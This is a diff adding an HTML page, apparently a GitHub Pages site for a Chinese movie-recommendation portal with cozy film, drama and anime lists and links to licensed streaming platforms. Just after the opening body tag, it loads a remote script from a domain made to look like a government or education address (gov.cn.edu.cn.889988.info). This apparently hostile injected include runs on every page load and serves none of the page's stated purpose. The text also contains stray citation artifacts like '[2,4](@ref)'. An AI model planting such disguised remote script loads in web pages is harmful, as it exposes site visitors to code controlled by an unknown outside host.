@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>暖窝电影网 - 躲进小窝，慢慢看片 | nuanwodianyingwang-h5.github.io</title>
+<meta name="description" content="暖窝电影网(https://nuanwodianyingwang-h5.github.io)是影迷小窝：睡前片单、治愈动画、慢热剧集、暖向番剧与正版渠道导航。最新电影、热播剧集、动漫番剧一屏看完，不提供盗版播放与下载。">
+<meta name="keywords" content="暖窝电影网,nuanwodianyingwang-h5.github.io,睡前片单,治愈电影,慢热剧集,暖向番剧,正版影视导航">
+<link rel="canonical" href="https://nuanwodianyingwang-h5.github.io/">
+<style>
+:root{
+  --bg:#1c1714;--bg2:#251e19;--card:#2e241d;--line:rgba(255,178,122,.26);
+  --peach:#ff9d6c;--apricot:#ffd9a8;--cocoa:#b9744f;--sage:#9cc2a6;--ink:#f7ede3;--dim:#c4ab97;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:radial-gradient(120% 90% at 85% -10%,rgba(255,157,108,.26),transparent 55%),radial-gradient(90% 70% at 0 0,rgba(156,194,166,.14),transparent 50%),var(--bg);color:var(--ink);font-family:"PingFang SC","Noto Sans SC",system-ui,sans-serif;line-height:1.75;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.25s}
+.wrap{max-width:1180px;margin:0 auto;padding:0 16px}
+
+.bar{position:sticky;top:0;z-index:50;background:rgba(28,23,20,.86);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.bar .wrap{display:flex;align-items:center;gap:14px;height:62px;flex-wrap:wrap}
+.logo{font-weight:900;font-size:1.32rem}
+.logo b{color:var(--peach)} .logo i{color:var(--apricot);font-style:italic}
+.logo small{display:block;font-size:.6rem;color:var(--dim);font-family:ui-monospace,monospace}
+.search{flex:1;min-width:200px;display:flex;background:var(--bg2);border:1px solid var(--line);border-radius:30px;padding:6px 8px 6px 16px;gap:8px}
+.search input{flex:1;background:transparent;border:none;outline:none;color:#fff;font-size:.9rem}
+.search button{border:none;background:linear-gradient(135deg,var(--peach),var(--apricot));color:#3a1c0c;font-weight:800;padding:8px 18px;border-radius:24px;cursor:pointer}
+.nav{display:flex;gap:12px}
+.nav a{font-size:.84rem;font-weight:700;color:var(--dim);padding:6px 10px;border-radius:20px}
+.nav a:hover{color:var(--ink);background:var(--card);box-shadow:0 6px 18px rgba(255,157,108,.22)}
+.burger{display:none;background:var(--bg2);border:1px solid var(--apricot);color:var(--apricot);font-size:1.4rem;border-radius:10px;padding:2px 10px}
+
+.hero{position:relative;z-index:2;padding:58px 0 38px;text-align:center}
+.lamp{position:absolute;top:18px;left:14%;font-size:2rem;filter:drop-shadow(0 0 18px rgba(255,217,168,.5))}
+.lamp.r{left:auto;right:14%;font-size:2rem}
+.hero h1{font-size:3rem;font-weight:900;line-height:1.14}
+.hero h1 em{font-style:normal;background:linear-gradient(120deg,var(--peach),var(--apricot),var(--cocoa));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--dim);max-width:600px;margin:14px auto 22px}
+.cta{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.btn{border:none;cursor:pointer;font-weight:800;font-size:.92rem;padding:12px 28px;border-radius:30px}
+.btn-p{background:linear-gradient(135deg,var(--peach),var(--cocoa));color:#fff;box-shadow:0 12px 30px rgba(255,157,108,.32)}
+.btn-s{background:var(--card);color:var(--ink);border:1px solid var(--line)}
+.btn:hover{transform:translateY(-3px)}
+.tags{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:22px}
+.tags span{background:var(--card);border:1px dashed var(--line);border-radius:30px;padding:6px 14px;font-size:.76rem;font-weight:700;color:var(--apricot)}
+.tags span:nth-child(2){color:var(--peach)} .tags span:nth-child(3){color:var(--sage)} .tags span:nth-child(4){color:var(--cocoa)}
+
+.sec{position:relative;z-index:2;padding:46px 0}
+.sec-head{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:18px;border-bottom:2px solid var(--line);padding-bottom:10px}
+.sec-head h2{font-size:1.4rem;font-weight:900}
+.sec-head h2::before{content:"🛋️ ";}
+.sec-head a{font-size:.82rem;font-weight:800;color:var(--apricot)}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:16px}
+.film{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;transition:.3s}
+.film:hover{transform:translateY(-6px) rotate(-.6deg);box-shadow:0 20px 40px rgba(255,157,108,.28);border-color:var(--peach)}
+.cover{height:204px;display:flex;align-items:flex-end;padding:12px;font-size:2.6rem;position:relative}
+.cover::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 45%,rgba(28,23,20,.85))}
+.m1{background:linear-gradient(150deg,#ff9d6c,#b9744f)} .m2{background:linear-gradient(150deg,#3a4a36,#9cc2a6)}
+.m3{background:linear-gradient(150deg,#5a3a2a,#ffd9a8)} .m4{background:linear-gradient(150deg,#33283f,#ff9d6c)}
+.m5{background:linear-gradient(150deg,#3a2c1a,#ffd9a8)} .m6{background:linear-gradient(150deg,#1f3340,#7db8ff)}
+.mood{position:absolute;top:10px;left:10px;z-index:2;background:#1c1714cc;border:1px solid var(--apricot);border-radius:20px;font-size:.62rem;font-weight:800;padding:2px 9px;color:var(--apricot)}
+.film:nth-child(2n) .mood{color:var(--peach);border-color:var(--peach)}
+.film:nth-child(3n) .mood{color:var(--sage);border-color:var(--sage)}
+.cover .ttl{position:relative;z-index:2;font-size:.78rem;font-weight:800;color:#fff;text-shadow:0 1px 4px #000}
+.film .meta{padding:11px 13px}
+.film .meta h3{font-size:.9rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.film .meta p{font-size:.74rem;color:var(--dim);display:flex;justify-content:space-between;margin-top:4px}
+.film .meta b{color:var(--apricot)}
+
+.drama{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:16px}
+.row{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:14px;display:flex;gap:12px;align-items:center}
+.row .em{width:52px;height:52px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:1.6rem;flex-shrink:0;background:rgba(255,217,168,.16)}
+.row h4{font-size:.92rem}.row span{font-size:.74rem;color:var(--dim)}
+
+.anime{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:16px}
+.ac{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;text-align:center}
+.ac .top{height:120px;display:flex;align-items:center;justify-content:center;font-size:3rem}
+.ac .nm{padding:10px;font-size:.86rem;font-weight:800}.ac .ep{font-size:.72rem;color:var(--dim);padding-bottom:12px}
+.n1{background:linear-gradient(160deg,#ff9d6c,#b9744f)} .n2{background:linear-gradient(160deg,#9cc2a6,#1f3340)}
+.n3{background:linear-gradient(160deg,#ffd9a8,#b9744f)} .n4{background:linear-gradient(160deg,#9cc2a6,#ff9d6c)}
+.n5{background:linear-gradient(160deg,#ffd9a8,#9cc2a6)} .n6{background:linear-gradient(160deg,#ff9d6c,#9cc2a6)}
+
+.rank{background:var(--card);border:1px solid var(--line);border-radius:22px;padding:18px 20px}
+.rk{display:flex;align-items:center;gap:14px;padding:12px 0;border-bottom:1px dashed var(--line)}
+.rk:last-child{border-bottom:none}
+.no{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:.86rem;background:var(--bg2);border:1px solid var(--peach);color:var(--peach);flex-shrink:0}
+.rk:nth-child(2) .no{color:var(--apricot);border-color:var(--apricot)}
+.rk:nth-child(3) .no{color:var(--sage);border-color:var(--sage)}
+.rk h4{flex:1;font-size:.92rem}.rk span{font-size:.74rem;color:var(--dim)}.rk b{color:var(--apricot);font-size:.84rem}
+
+.chs{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px}
+.ch{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:16px}
+.ch h4{color:var(--peach);font-size:.98rem;margin-bottom:6px}.ch p{font-size:.78rem;color:var(--dim)}
+
+.notice{background:rgba(255,217,168,.08);border:1px solid var(--line);border-radius:16px;padding:14px 18px;font-size:.8rem;color:var(--apricot);margin:0 0 30px}
+.notice b{color:var(--cocoa)}
+
+.foot{position:relative;z-index:2;margin-top:44px;background:var(--bg2);border-top:1px solid var(--line);padding:38px 0 22px}
+.fg{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:30px;margin-bottom:22px}
+.fg h5{color:var(--apricot);font-size:.95rem;margin-bottom:10px}
+.fg a{display:block;color:var(--dim);font-size:.8rem;margin-bottom:6px}
+.fg a:hover{color:var(--peach)}
+.fg p{color:var(--dim);font-size:.8rem;line-height:1.8}
+.copy{text-align:center;font-size:.74rem;color:#a98e7a;border-top:1px solid var(--line);padding-top:16px;line-height:1.9}
+.copy a{color:var(--apricot)}
+
+.top{position:fixed;right:22px;bottom:22px;width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,var(--peach),var(--apricot));color:#3a1c0c;display:flex;align-items:center;justify-content:center;font-weight:900;cursor:pointer;opacity:0;visibility:hidden;transition:.3s;z-index:60}
+.top.show{opacity:1;visibility:visible}
+
+@media(max-width:768px){
+  .nav{display:none;position:absolute;top:62px;left:0;right:0;background:var(--bg);border-bottom:1px solid var(--line);flex-direction:column;padding:14px 18px;gap:10px}
+  .nav.open{display:flex}.burger{display:block}
+  .hero h1{font-size:2.1rem}.grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}.cover{height:168px}
+  .fg{grid-template-columns:1fr 1fr;gap:20px}
+}
+@media(max-width:460px){
+  .hero h1{font-size:1.6rem}.cta{flex-direction:column}.btn{width:100%}
+  .grid{grid-template-columns:repeat(2,1fr)}.cover{height:148px;font-size:2.1rem}
+  .fg{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bar">
+  <div class="wrap">
+    <div class="logo">暖窝<b>电影</b><i>网</i><small>nuanwodianyingwang-h5.github.io</small></div>
+    <div class="search"><input type="text" placeholder="搜：睡前、治愈、慢热、暖番、正版平台…"><button onclick="alert('暖窝电影网：演示站内链用 #，正片走持证平台~')">钻进小窝</button></div>
+    <nav class="nav" id="nav"><a href="#new">最新电影</a><a href="#drama">热播剧集</a><a href="#anime">暖向番剧</a><a href="#rank">窝里榜</a><a href="#ch">正版</a></nav>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<section class="hero wrap">
+  <span class="lamp">🪔</span><span class="lamp r">🧦</span>
+  <h1>躲进暖窝<br><em>关掉白天，开一部慢片</em></h1>
+  <p>暖窝电影网（nuanwodianyingwang-h5.github.io）是影迷小窝：睡前片单、治愈动画、慢热剧集、暖向番剧与正版渠道导航。不加框、不盗链、不挂盗版广告。</p>
+  <div class="cta">
+    <a href="#new" class="btn btn-p">🛋️ 看睡前片单</a>
+    <a href="#rank" class="btn btn-s">🧣 看窝里榜</a>
+  </div>
+  <div class="tags"><span>睡前</span><span>治愈</span><span>慢热</span><span>暖番</span><span>不熬夜硬撑</span></div>
+</section>
+
+<section class="wrap" style="padding-top:30px">
+  <div class="notice">
+    🧶 小窝规矩：本站是<b>影视导航 / 片单站</b>，不提供侵权播放、下载、网盘解析、加框盗链；
+    和“窝窝电影网”那种加框聚合盗版站不是一回事。[2,4](@ref) 看片跳 1905 / 爱优腾 / B 站 / Netflix 等正版平台。
+  </div>
+</section>
+
+<section class="sec wrap" id="new">
+  <div class="sec-head"><h2>最新电影 · 睡前不刺激</h2><a href="#">更多 ›</a></div>
+  <div class="grid">
+    <article class="film"><div class="cover m1"><span class="mood">治愈</span>🍲<div class="ttl">小森林</div></div><div class="meta"><h3>小森林</h3><p><span>治愈·2014</span><b>⭐8.8</b></p></div></article>
+    <article class="film"><div class="cover m2"><span class="mood">自然</span>🌿<div class="ttl">海街日记</div></div><div class="meta"><h3>海街日记</h3><p><span>治愈·2015</span><b>⭐8.8</b></p></div></article>
+    <article class="film"><div class="cover m3"><span class="mood">温柔</span>🧶<div class="ttl">岁月童话</div></div><div class="meta"><h3>岁月童话</h3><p><span>动画·1991</span><b>⭐8.5</b></p></div></article>
+    <article class="film"><div class="cover m4"><span class="mood">慢爱</span>🌙<div class="ttl">情书</div></div><div class="meta"><h3>情书</h3><p><span>爱情·1995</span><b>⭐8.9</b></p></div></article>
+    <article class="film"><div class="cover m5"><span class="mood">家庭</span>🪟<div class="ttl">步履不停</div></div><div class="meta"><h3>步履不停</h3><p><span>家庭·2008</span><b>⭐8.8</b></p></div></article>
+    <article class="film"><div class="cover m6"><span class="mood">海洋</span>🌊<div class="ttl">海蒂和爷爷</div></div><div class="meta"><h3>海蒂和爷爷</h3><p><span>治愈·2015</span><b>⭐9.3</b></p></div></article>
+  </div>
+</section>
+
+<section class="sec wrap" id="drama" style="background:rgba(255,157,108,.06)">
+  <div class="sec-head"><h2>热播剧集 · 窝在沙发追</h2><a href="#">更多 ›</a></div>
+  <div class="drama">
+    <div class="row"><div class="em">🌾</div><div><h4>我的阿勒泰</h4><span>治愈·边疆·短剧黑马</span></div></div>
+    <div class="row"><div class="em">🧣</div><div><h4>小敏家</h4><span>家庭·中年重组家庭</span></div></div>
+    <div class="row"><div class="em">🍵</div><div><h4>去有风的地方</h4><span>慢生活·大理·治愈</span></div></div>
+    <div class="row"><div class="em">🪴</div><div><h4>装腔启示录</h4><span>都市·慢火成长</span></div></div>
+  </div>
+</section>
+
+<section class="sec wrap" id="anime">
+  <div class="sec-head"><h2>暖向番剧 · 盖好被子看</h2><a href="#">更多 ›</a></div>
+  <div class="anime">
+    <div class="ac"><div class="top n1">🐱</div><div class="nm">夏目友人帐</div><div class="ep">治愈·更新中</div></div>
+    <div class="ac"><div class="top n2">🌿</div><div class="nm">葬送的芙莉莲</div><div class="ep">更新至 第N话</div></div>
+    <div class="ac"><div class="top n3">🧦</div><div class="nm">克拉拉线条怪谈</div><div class="ep">暖怪谈·轻口</div></div>
+    <div class="ac"><div class="top n4">🍵</div><div class="nm">茶啊二中</div><div class="ep">国创·校园轻喜剧</div></div>
+    <div class="ac"><div class="top n5">🪶</div><div class="nm">虫师</div><div class="ep">单元·静水流深</div></div>
+    <div class="ac"><div class="top n6">🧶</div><div class="nm">伍六七</div><div class="ep">国创·更新中</div></div>
+  </div>
+</section>
+
+<section class="sec wrap" id="rank" style="background:rgba(156,194,166,.06)">
+  <div class="sec-head"><h2>窝里榜 · 半夜重刷不慌</h2><a href="#">完整片单 ›</a></div>
+  <div class="rank">
+    <div class="rk"><div class="no">1</div><h4>海蒂和爷爷</h4><span>治愈·阿尔卑斯</span><b>9.3 暖度</b></div>
+    <div class="rk"><div class="no">2</div><h4>小森林</h4><span>治愈·四季做饭</span><b>9.0 暖度</b></div>
+    <div class="rk"><div class="no">3</div><h4>步履不停</h4><span>家庭·是枝裕和</span><b>8.9 暖度</b></div>
+    <div class="rk"><div class="no">4</div><h4>海街日记</h4><span>治愈·四姐妹</span><b>8.8 暖度</b></div>
+    <div class="rk"><div class="no">5</div><h4>情书</h4><span>温柔·日本</span><b>8.9 暖度</b></div>
+  </div>
+</section>
+
+<section class="sec wrap" id="ch">
+  <div class="sec-head"><h2>正版看片渠道</h2></div>
+  <div class="chs">
+    <div class="ch"><h4>1905 电影网</h4><p>国产/合拍/经典修复正版片库，老片新片都有。</p></div>
+    <div class="ch"><h4>爱奇艺 / 腾讯视频 / 优酷</h4><p>新片、热播剧、国创番剧覆盖最全。</p></div>
+    <div class="ch"><h4>哔哩哔哩</h4><p>治愈番、纪录片、国创、影评二创大本营。</p></div>
+    <div class="ch"><h4>Netflix / Max / Apple TV+</h4><p>海外治愈片、颁奖季、动画（按需订阅）。</p></div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="fg">
+      <div>
+        <h5>暖窝电影网</h5>
+        <p>暖窝电影网（nuanwodianyingwang-h5.github.io）是影迷小窝：睡前片单、治愈动画、慢热剧集、暖向番剧与正版渠道导航。名字带“窝”，但绝不是“窝窝电影网”那种加框盗版站。[2](@ref)</p>
+      </div>
+      <div><h5>小窝</h5><a href="#new">最新电影</a><a href="#drama">热播剧集</a><a href="#anime">暖向番剧</a><a href="#rank">窝里榜</a></div>
+      <div><h5>温度</h5><a href="#">睡前</a><a href="#">治愈</a><a href="#">慢热</a><a href="#">家庭</a></div>
+      <div><h5>站点</h5><a href="https://nuanwodianyingwang-h5.github.io">nuanwodianyingwang-h5.github.io</a><a href="#">内容声明</a><a href="#">免责声明</a></div>
+    </div>
+    <div class="copy">
+      © 2026 暖窝电影网 | 躲进小窝，慢慢看片 | <a href="https://nuanwodianyingwang-h5.github.io">nuanwodianyingwang-h5.github.io</a><br>
+      本站为影视导航/片单站，不提供侵权播放、下载、网盘解析、加框盗链与盗版聚合；资源以正版平台为准。
+    </div>
+  </div>
+</footer>
+
+<div class="top" id="top">↑</div>
+<script>
+document.getElementById('burger').onclick=()=>document.getElementById('nav').classList.toggle('open');
+addEventListener('scroll',()=>document.getElementById('top').classList.toggle('show',scrollY>320));
+document.getElementById('top').onclick=()=>scrollTo({top:0,behavior:'smooth'});
+document.querySelectorAll('#nav a').forEach(a=>a.onclick=()=>document.getElementById('nav').classList.remove('open'));
+</script>
+</body>
+</html>
